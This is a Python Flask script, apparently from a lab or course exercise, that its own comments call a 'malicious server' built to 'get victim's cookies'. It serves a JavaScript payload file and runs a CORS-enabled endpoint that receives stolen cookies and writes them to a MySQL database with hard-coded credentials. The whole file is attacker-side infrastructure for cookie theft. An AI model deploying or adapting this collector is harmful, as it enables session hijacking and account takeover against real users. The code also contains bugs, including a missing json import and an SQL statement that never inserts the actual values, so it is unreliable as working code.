#PLAN: 
#    Learn + use Flask
#    Find out how to run a 2nd server simultaneously
#    Use malicious server to get victim's cookies

from flask import Flask, request, redirect, send_file, make_response
from flask_cors import CORS
import mysql.connector

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET']) 
def index():
    return '''
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>malicious server</title>
  </head>
  <body>
    <h1>Hello! Here is malicious server!</h1>
  </body>
</html>
    '''
    
@app.route('/cookies.js', methods=['GET'])
def sending_cookie():
    return send_file('./payload_cookiejar.js', attachment_filename='payload_cookiejar.js')
    
@app.route('/receiveCookie',methods=['POST', 'OPTIONS'])
def receive_cookie():
    # Handle COR preflight request
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        response.headers.add('Access-Control-Allow-Credentials', 'true')
        return response
        
    json_cookies = request.get_json()
    print (json.dumps(request.get_json(), indent=2, ensure_ascii=False))
    http_cookies = request.cookies.to_dict()

    cookies = {}
    for key in set(json_cookies.keys()).union(set(http_cookies.keys())):
        if key in json_cookies and key in http_cookies:
            if json_cookies[key] == http_cookies[key]:
                cookies[key] = json_cookies[key]
        else:
            if key in json_cookies:
                cookies[key] = json_cookies[key]
            else:
                cookies[key] = http_cookies[key]
    
    conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
    cursor = conn.cursor()
    for key, value in cookies.items():
    	insert_cookie = ("insert into cookies (cookie) values (concat(key,':',value));")
    	cursor.execute(insert_cookie)
    	conn.commit()
    #test_insert = ("insert into cookies (cookie) values ('test2');")
    cursor.close()
    conn.close()
    
    response = make_response()
    response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return(response, 204)


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
